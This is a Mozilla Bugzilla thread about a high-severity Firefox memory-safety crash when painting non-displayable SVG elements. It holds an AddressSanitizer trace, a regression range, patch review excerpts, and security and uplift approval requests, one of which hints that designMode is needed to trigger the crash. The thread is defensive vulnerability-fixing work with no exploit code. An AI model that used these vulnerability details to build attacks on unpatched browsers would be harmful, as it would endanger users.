SUMMARY: AddressSanitizer: SEGV /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2465:13 in mozilla::ipc::MessageChannel::OnChannelErrorFromLink()
Thread T2 (Chrome\_ChildThr) created by T0 (Web Content) here:
#0 0x4a3d56 in \_\_interceptor\_pthread\_create /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan\_interceptors.cc:245:3
#1 0x7f4597a001ec in CreateThread /home/worker/workspace/build/src/ipc/chromium/src/base/platform\_thread\_posix.cc:139:14
#2 0x7f4597a001ec in PlatformThread::Create(unsigned long, PlatformThread::Delegate\*, unsigned long\*) /home/worker/workspace/build/src/ipc/chromium/src/base/platform\_thread\_posix.cc:150
#3 0x7f4597a1187e in base::Thread::StartWithOptions(base::Thread::Options const&) /home/worker/workspace/build/src/ipc/chromium/src/base/thread.cc:98:8
#4 0x7f4597a968d7 in mozilla::ipc::ProcessChild::ProcessChild(int) /home/worker/workspace/build/src/ipc/glue/ProcessChild.cpp:24:5
#5 0x7f45a0539a42 in ContentProcess /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/ContentProcess.h:31:7
#6 0x7f45a0539a42 in XRE\_InitChildProcess(int, char\*\*, XREChildData const\*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:654
#7 0x4eb7a3 in content\_process\_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30
#8 0x4eb7a3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:285
#9 0x7f45b272782f in \_\_libc\_start\_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291
==28371==ABORTING

|  | [Nils](/user_profile?user_id=344130)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1365189#c1)• 8 years ago |
|  | |

Attached file
[ASAN output](attachment.cgi?id=8868039)
— [Details](attachment.cgi?id=8868039&action=edit)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1365189#c2)• 8 years ago |
|  | |

INFO: Last good revision: 44ae8462d6ab (2014-03-12)
INFO: First bad revision: 46041cc216fd (2014-03-13)
INFO: Pushlog:
<https://hg.mozilla.org/mozilla-central/pushloghtml?fromchange=44ae8462d6ab&tochange=46041cc216fd>
[Bug 948265](/show_bug.cgi?id=948265 "VERIFIED FIXED - Render CSS Filters using Moz2D") maybe?
<https://hg.mozilla.org/mozilla-central/rev/7997cb5af49c>Has Regression Range: --- → yes
[status-firefox53](/buglist.cgi?f1=cf_status_firefox53&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox53&o1=equals&v1=wontfix)
[status-firefox54](/buglist.cgi?f1=cf_status_firefox54&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=affected)
[status-firefox55](/buglist.cgi?f1=cf_status_firefox55&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=affected)
[status-firefox-esr45](/buglist.cgi?f1=cf_status_firefox_esr45&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr45&o1=equals&v1=wontfix)
[status-firefox-esr52](/buglist.cgi?f1=cf_status_firefox_esr52&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=affected)
[tracking-firefox54](/buglist.cgi?f1=cf_tracking_firefox54&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox54&o1=equals&v1=%3F)
[tracking-firefox55](/buglist.cgi?f1=cf_tracking_firefox55&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%3F)
[tracking-firefox-esr52](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=%3F)Flags: needinfo?(jwatt)Version: Trunk → 30 Branch

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1365189#a120794_11539)• 8 years ago |

Keywords: [csectype-bounds](/buglist.cgi?keywords=csectype-bounds&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Gerry Chang [:gchang]](/user_profile?user_id=506302) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1365189#c3)• 8 years ago |
|  | |

Track 54+/55+ as sec-high.
[tracking-firefox54](/buglist.cgi?f1=cf_tracking_firefox54&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox54&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_firefox54&o1=equals&v1=%2B)
[tracking-firefox55](/buglist.cgi?f1=cf_tracking_firefox55&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%2B)

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1365189#c4)• 8 years ago |
|  | |

Attached file
[simplified testcase](attachment.cgi?id=8868950)
— [Details](attachment.cgi?id=8868950&action=edit)

Assignee: nobody → jwatt
[Attachment #8868038](/attachment.cgi?id=8868038&action=edit "crash.html (testcase, crashes firefox)") -
Attachment is obsolete: trueFlags: needinfo?(jwatt)

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1365189#c5)• 8 years ago |
|  | |

Attached patch

[part 1 - Prevent painting of non-displayable SVG elements](attachment.cgi?id=8868981&action=diff) (obsolete)
— [Details](attachment.cgi?id=8868981&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8868981)

Either of these checks is sufficient to prevent this crash, but both seem like they should be added.
[Attachment #8868981](/attachment.cgi?id=8868981&action=edit "part 1 - Prevent painting of non-displayable SVG elements") -
Flags: review?(dholbert)

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1365189#c6)• 8 years ago |
|  | |

Attached patch

[part 2 - Add crashtest for crash painting non-displayable SVG element as background image](attachment.cgi?id=8868982&action=diff) (obsolete)
— [Details](attachment.cgi?id=8868982&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8868982)

[Attachment #8868982](/attachment.cgi?id=8868982&action=edit "part 2 - Add crashtest for crash painting non-displayable SVG element as background image") -
Flags: review?(dholbert)

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1365189#c7)• 8 years ago |
|  | |

Attached patch

[part 2 - Add crashtest for crash painting non-displayable SVG element as background image](attachment.cgi?id=8868983&action=diff)
— [Details](attachment.cgi?id=8868983&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8868983)

[Attachment #8868982](/attachment.cgi?id=8868982&action=edit "part 2 - Add crashtest for crash painting non-displayable SVG element as background image") -
Attachment is obsolete: true
[Attachment #8868982](/attachment.cgi?id=8868982&action=edit "part 2 - Add crashtest for crash painting non-displayable SVG element as background image") -
Flags: review?(dholbert)
[Attachment #8868983](/attachment.cgi?id=8868983&action=edit "part 2 - Add crashtest for crash painting non-displayable SVG element as background image") -
Flags: review?(dholbert)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1365189#a293484_1689)• 8 years ago |

Group: core-security → layout-core-security

|  | [Daniel Holbert [:dholbert]](/user_profile?user_id=278074) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1365189#c8)• 8 years ago |
|  | |

Comment on [attachment 8868981](/attachment.cgi?id=8868981 "part 1 - Prevent painting of non-displayable SVG elements") [[details]](/attachment.cgi?id=8868981&action=edit "part 1 - Prevent painting of non-displayable SVG elements") [[diff]](/attachment.cgi?id=8868981&action=diff "part 1 - Prevent painting of non-displayable SVG elements") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8868981)
part 1 - Prevent painting of non-displayable SVG elements
Review of [attachment 8868981](/attachment.cgi?id=8868981 "part 1 - Prevent painting of non-displayable SVG elements") [[details]](/attachment.cgi?id=8868981&action=edit "part 1 - Prevent painting of non-displayable SVG elements") [[diff]](/attachment.cgi?id=8868981&action=diff "part 1 - Prevent painting of non-displayable SVG elements") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8868981):
-----------------------------------------------------------------
::: layout/painting/nsImageRenderer.cpp
@@ +194,5 @@
> nsLayoutUtils::SurfaceFromElement(property->GetReferencedElement());
> if (!mImageElementSurface.GetSourceSurface()) {
> + nsIFrame\* paintServerFrame = property->GetReferencedFrame();
> + if (!paintServerFrame ||
> + // trying to display non-displayable frames can crash
Right now this sounds kind of like a band-aid "oops let's not crash" kind of comment, which makes it a little harder to trust.
Could you pull this out of the if condition and phrase it more clearly to explain the control flow? Something like:
// If there's no referenced frame, or the referenced frame is
// non-displayable SVG, then we have nothing valid to paint.
if (!paintServerFrame || [...]
::: layout/svg/nsSVGIntegrationUtils.cpp
@@ +1275,5 @@
> }
>
> + if (aFrame->IsFrameOfType(nsIFrame::eSVG) &&
> + !static\_cast<nsSVGDisplayableFrame\*>(do\_QueryFrame(aFrame))) {
> + return nullptr; // trying to display non-displayable frames can crash
This, too, feels a bit like an "oops how did we get here" kind of comment. If it is -- and that might be OK -- we should perhaps convert it into a NS\_ERROR(...) just before the "return nullptr".
(Because: this seems like something we should catch earlier on, when we decide on aFrame, ideally -- as we do in the nsImageRenderer codepath via your other tweak here. So it'd be handy to have this be something that fuzzers can detect & file bugs about, so we can catch any other callers into this code that pass in non-displayable frames.)
[Attachment #8868981](/attachment.cgi?id=8868981&action=edit "part 1 - Prevent painting of non-displayable SVG elements") -
Flags: review?(dholbert) → review+

|  | [Daniel Holbert [:dholbert]](/user_profile?user_id=278074) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1365189#c9)• 8 years ago |
|  | |

Comment on [attachment 8868983](/attachment.cgi?id=8868983 "part 2 - Add crashtest for crash painting non-displayable SVG element as background image") [[details]](/attachment.cgi?id=8868983&action=edit "part 2 - Add crashtest for crash painting non-displayable SVG element as background image") [[diff]](/attachment.cgi?id=8868983&action=diff "part 2 - Add crashtest for crash painting non-displayable SVG element as background image") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8868983)
part 2 - Add crashtest for crash painting non-displayable SVG element as background image
Review of [attachment 8868983](/attachment.cgi?id=8868983 "part 2 - Add crashtest for crash painting non-displayable SVG element as background image") [[details]](/attachment.cgi?id=8868983&action=edit "part 2 - Add crashtest for crash painting non-displayable SVG element as background image") [[diff]](/attachment.cgi?id=8868983&action=diff "part 2 - Add crashtest for crash painting non-displayable SVG element as background image") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8868983):
-----------------------------------------------------------------
r=me on the crashtest (landing after the fix has made it to all supported builds of course), assuming you've verified that it does crash in the crashtest harness in unpatched builds.
[Attachment #8868983](/attachment.cgi?id=8868983&action=edit "part 2 - Add crashtest for crash painting non-displayable SVG element as background image") -
Flags: review?(dholbert) → review+

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1365189#c10)• 8 years ago |
|  | |

The nsImageRenderer.cpp change is the earliest possible point where we can check whether the element that the content references is valid. That check is not a "just in case" check. It's entirely possible for content to reference nonsensical elements, and this is the logical place to guard against that.
The nsSVGIntegrationUtils.cpp is more of a safety check since there are ways other than -moz-element to enter this code. Adding an NS\_ERROR sounds like a good idea. MOZ\_ASSERT\_UNREACHABLE sounds better to me though. :)

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1365189#c11)• 8 years ago |
|  | |

Attached patch

[part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]](attachment.cgi?id=8871200&action=diff) (obsolete)
— [Details](attachment.cgi?id=8871200&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8871200)

[Security approval request comment]
How easily could an exploit be constructed based on the patch?
It would take some work or knowledge of our code to figure out what sort of markup would get us into the error state. The apparent need for designMode is particularly non-obvious.
Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?
Hopefully not.
Which older supported branches are affected by this flaw?
All of them (everything back to March 2014 - <https://hg.mozilla.org/mozilla-central/rev/7997cb5af49c> )
If not all supported branches, which bug introduced the flaw?
[Bug 948265](/show_bug.cgi?id=948265 "VERIFIED FIXED - Render CSS Filters using Moz2D").
Do you have backports for the affected branches? If not, how different, hard to create, and risky will they be?
Not backported yet, but should be simple enough.
How likely is this patch to cause regressions; how much testing does it need?
Pretty unlikely. We're making an error condition a no-op.
[Attachment #8868981](/attachment.cgi?id=8868981&action=edit "part 1 - Prevent painting of non-displayable SVG elements") -
Attachment is obsolete: true
[Attachment #8871200](/attachment.cgi?id=8871200&action=edit "part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]") -
Flags: sec-approval?
[Attachment #8871200](/attachment.cgi?id=8871200&action=edit "part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]") -
Flags: review+

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1365189#c12)• 8 years ago |
|  | |

sec-approval+ for trunk.
We'll want this on Beta and ESR52 as well.
[tracking-firefox-esr52](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=%3F) → [54+](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=54%2B)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1365189#a897421_280903)• 8 years ago |

[Attachment #8871200](/attachment.cgi?id=8871200&action=edit "part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]") -
Flags: sec-approval? → sec-approval+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1365189#c13)• 8 years ago |
|  | |

<https://hg.mozilla.org/integration/mozilla-inbound/rev/7b3e7c43611ba7c586eacfd00af7dce905f97b92>
Please request Beta and ESR52 approval on this at your earliest convenience.Flags: needinfo?(jwatt)Flags: in-testsuite?

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1365189#c14)• 8 years ago |
|  | |

Comment on [attachment 8871200](/attachment.cgi?id=8871200 "part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]") [[details]](/attachment.cgi?id=8871200&action=edit "part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]") [[diff]](/attachment.cgi?id=8871200&action=diff "part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8871200)
part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]
[Approval Request Comment]
If this is not a sec:{high,crit} bug, please state case for ESR consideration:
User impact if declined: sec vuln
Fix Landed on Version: 55
Risk to taking this patch (and alternatives if risky): low
String or UUID changes made by this patch: none
See <https://wiki.mozilla.org/Release_Management/ESR_Landing_Process> for more info.
Approval Request Comment
[Feature/Bug causing the regression]: [bug 948265](/show_bug.cgi?id=948265 "VERIFIED FIXED - Render CSS Filters using Moz2D")
[Has the fix been verified in Nightly?]: just landed
[Needs manual test from QE? If yes, steps to reproduce]: no
[List of other uplifts needed for the feature/fix]: noneFlags: needinfo?(jwatt)
[Attachment #8871200](/attachment.cgi?id=8871200&action=edit "part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]") -
Flags: approval-mozilla-esr52?
[Attachment #8871200](/attachment.cgi?id=8871200&action=edit "part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]") -
Flags: approval-mozilla-beta?

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1365189#c15)• 8 years ago |
|  | |

Comment on [attachment 8871200](/attachment.cgi?id=8871200 "part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]") [[details]](/attachment.cgi?id=8871200&action=edit "part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]") [[diff]](/attachment.cgi?id=8871200&action=diff "part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8871200)
part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]
Had to back this out for reftest failures :(
<https://hg.mozilla.org/integration/mozilla-inbound/rev/3b51e0c8b6cce5ccc6c81c3bbbeafaf5dcab8b30>
<https://treeherder.mozilla.org/logviewer.html#?job_id=103244755&repo=mozilla-inbound>
[Attachment #8871200](/attachment.cgi?id=8871200&action=edit "part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]") -
Flags: approval-mozilla-esr52?
[Attachment #8871200](/attachment.cgi?id=8871200&action=edit "part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]") -
Flags: approval-mozilla-beta?

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1365189#c16)• 8 years ago |
|  | |

Marked Firefox 54 and ESR52.2 as won't fix since we've built release candidates or are in the process of doing so.
[tracking-firefox-esr52](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=isnotempty):
[54+](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=54%2B) → [55+](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=55%2B)

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1365189#c17)• 8 years ago |
|  | |

As a sec-high that landed on m-c, is this a candidate for point releases, perhaps as an add-on?Flags: needinfo?(abillings)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1365189#c18)• 8 years ago |
|  | |

We can't ship add-ons for compiled code. The only options here are point release ride-along or shipping with 55/ESR52.3 at this point.

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1365189#c19)• 8 years ago |
|  | |

I'm not sure why I'm ni? here. This bounced and isn't in 54. Barring a point release, this goes to 55. Release Management will make the call on a point release but unless we think this is a realistic zero day, it probably is just going to wait for 55.Flags: needinfo?(abillings)

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1365189#c20)• 8 years ago |
|  | |

Drat, I just noticed this bounced when I happened to notice this is mentioned as being assigned to me in the latest tracking email. Investigating.Flags: needinfo?(jwatt)

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1365189#c21)• 8 years ago |
|  | |

Attached patch

[part 1 - Prevent painting of non-displayable SVG elements](attachment.cgi?id=8879644&action=diff) (obsolete)
— [Details](attachment.cgi?id=8879644&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8879644)

It seems that -moz-element is allowed to reference SVG paint server's directly. This fixes that and now the failing tests pass.
[Attachment #8871200](/attachment.cgi?id=8871200&action=edit "part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]") -
Attachment is obsolete: trueFlags: needinfo?(jwatt)
[Attachment #8879644](/attachment.cgi?id=8879644&action=edit "part 1 - Prevent painting of non-displayable SVG elements") -
Flags: review?(dholbert)

|  | [Daniel Holbert [:dholbert]](/user_profile?user_id=278074) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1365189#c22)• 8 years ago |
|  | |

Comment on [attachment 8879644](/attachment.cgi?id=8879644 "part 1 - Prevent painting of non-displayable SVG elements") [[details]](/attachment.cgi?id=8879644&action=edit "part 1 - Prevent painting of non-displayable SVG elements") [[diff]](/attachment.cgi?id=8879644&action=diff "part 1 - Prevent painting of non-displayable SVG elements") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8879644)
part 1 - Prevent painting of non-displayable SVG elements
r=me with comment tweaked to hint at the now-modified condition, as discussed on IRC
[Attachment #8879644](/attachment.cgi?id=8879644&action=edit "part 1 - Prevent painting of non-displayable SVG elements") -
Flags: review?(dholbert) → review+

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1365189#c23)• 8 years ago |
|  | |

Attached patch

[part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]](attachment.cgi?id=8879650&action=diff)
— [Details](attachment.cgi?id=8879650&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8879650)

[Attachment #8879644](/attachment.cgi?id=8879644&action=edit "part 1 - Prevent painting of non-displayable SVG elements") -
Attachment is obsolete: true
[Attachment #8879650](/attachment.cgi?id=8879650&action=edit "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") -
Flags: review+

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1365189#c24)• 8 years ago |
|  | |

Attached patch

[part 1 patch for mozilla-beta](attachment.cgi?id=8879677&action=diff)
— [Details](attachment.cgi?id=8879677&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8879677)

Same as for trunk but with a minor #include conflict resolved. Confirmed that this compiles.

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1365189#c25)• 8 years ago |
|  | |

Attached patch

[part 1 patch for mozilla-esr52](attachment.cgi?id=8879678&action=diff)
— [Details](attachment.cgi?id=8879678&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8879678)

Had the same minor conflict in the #includes section, plus I had to change the name of nsSVGDisplayableFrame to its old class name nsISVGChildFrame to get the patch to compile.

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1365189#c26)• 8 years ago |
|  | |

Oh, and for the esr52 patch the patched code is layout/base/nsCSSRendering.cpp rather than in layout/painting/nsImageRenderer.cpp. It's the same code though.

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1365189#c27)• 8 years ago |
|  | |

Attached patch

[part 1 patch for mozilla-release (in the off chance we wanted to take this as a ridealong)](attachment.cgi?id=8879681&action=diff)
— [Details](attachment.cgi?id=8879681&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8879681)

Again, the same minor conflict in the #includes section, and the patched code is is in layout/painting/nsCSSRendering.cpp rather than in layout/painting/nsImageRenderer.cpp as it is on trunk (same code though).

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1365189#c28)• 8 years ago |
|  | |

Comment on [attachment 8879650](/attachment.cgi?id=8879650 "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") [[details]](/attachment.cgi?id=8879650&action=edit "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") [[diff]](/attachment.cgi?id=8879650&action=diff "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8879650)
part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]
[Security approval request comment]
How easily could an exploit be constructed based on the patch?
Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?
Which older supported branches are affected by this flaw?
If not all supported branches, which bug introduced the flaw?
Do you have backports for the affected branches? If not, how different, hard to create, and risky will they be?
How likely is this patch to cause regressions; how much testing does it need?
[Security approval request comment]
How easily could an exploit be constructed based on the patch?
It would take some work or knowledge of our code to figure out what sort of markup would get us into the error state. The apparent need for designMode is particularly non-obvious.
Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?
Hopefully not.
Which older supported branches are affected by this flaw?
All of them (everything back to March 2014 - <https://hg.mozilla.org/mozilla-central/rev/7997cb5af49c> )
If not all supported branches, which bug introduced the flaw?
[Bug 948265](/show_bug.cgi?id=948265 "VERIFIED FIXED - Render CSS Filters using Moz2D").
Do you have backports for the affected branches? If not, how different, hard to create, and risky will they be?
Yes, backports for beta, esr52 and release all attached.
How likely is this patch to cause regressions; how much testing does it need?
It has passed Try (pushed there since this essentially already made it to trunk). Should be low risk.
[Attachment #8879650](/attachment.cgi?id=8879650&action=edit "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") -
Flags: sec-approval?

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1365189#c29)• 8 years ago |
|  | |

Comment on [attachment 8879650](/attachment.cgi?id=8879650 "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") [[details]](/attachment.cgi?id=8879650&action=edit "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") [[diff]](/attachment.cgi?id=8879650&action=diff "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8879650)
part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]
sec-approval+ for trunk.
[Attachment #8879650](/attachment.cgi?id=8879650&action=edit "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") -
Flags: sec-approval? → sec-approval+

|  | [Wes Kocher (:KWierso) (Not reading bugmail; email directly if needed)](/user_profile?user_id=308534) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1365189#c30)• 8 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/af94bc2592d1>Status: NEW → RESOLVEDClosed: 8 years ago
[status-firefox56](/buglist.cgi?f1=cf_status_firefox56&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → mozilla56

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1365189#a3251905_1689)• 8 years ago |

Group: layout-core-security → core-security-release

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1365189#c31)• 8 years ago |
|  | |

Looks like this stuck :). Please request Beta & ESR52 approval on this when you get a chance.
[status-firefox54](/buglist.cgi?f1=cf_status_firefox54&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=wontfix)Flags: needinfo?(jwatt)

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)  Assignee |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1365189#c32)• 8 years ago |
|  | |

Comment on [attachment 8879650](/attachment.cgi?id=8879650 "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") [[details]](/attachment.cgi?id=8879650&action=edit "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") [[diff]](/attachment.cgi?id=8879650&action=diff "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8879650)
part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]
[Approval Request Comment]
If this is not a sec:{high,crit} bug, please state case for ESR consideration: ESR has the sec issue.
User impact if declined: potential security hole.
Fix Landed on Version: 56
Risk to taking this patch (and alternatives if risky): should be low
String or UUID changes made by this patch: none
See <https://wiki.mozilla.org/Release_Management/ESR_Landing_Process> for more info.
Approval Request Comment
[Feature/Bug causing the regression]: [bug 948265](/show_bug.cgi?id=948265 "VERIFIED FIXED - Render CSS Filters using Moz2D").
[User impact if declined]: potential security hole.
[Is this code covered by automated tests?]: the attached test was run manually, but has not yet been landed due to security considerations.
[Has the fix been verified in Nightly?]: yes
[Needs manual test from QE? If yes, steps to reproduce]: run the attached test.
[List of other uplifts needed for the feature/fix]: none
[Is the change risky?]: should be low risk.
[Why is the change risky/not risky?]: We're making an error condition a no-op.
[String changes made/needed]: noneFlags: needinfo?(jwatt)
[Attachment #8879650](/attachment.cgi?id=8879650&action=edit "part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]") -
